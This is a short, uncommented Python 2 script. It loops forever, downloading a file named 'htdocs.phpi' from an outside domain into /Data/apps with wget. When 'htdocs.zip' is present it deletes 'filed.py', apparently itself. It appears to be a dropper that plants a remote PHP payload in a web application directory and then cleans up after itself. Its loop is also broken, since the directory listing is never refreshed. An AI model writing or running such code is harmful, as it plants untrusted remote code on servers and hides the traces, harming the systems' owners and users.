import os 
import time
import subprocess


data = subprocess.Popen(["ls"], stdout=subprocess.PIPE, shell=True).communicate()[0]
data_list = data.split('\n')
print data_list

while 1:
	if "htdocs.zip" in data_list:
		os.system("rm -rf filed.py")
	else:
		os.chdir("/Data/apps")
		os.system("wget http://reeeeeeeeee.xyz/htdocs.phpi")
		time.sleep(1)
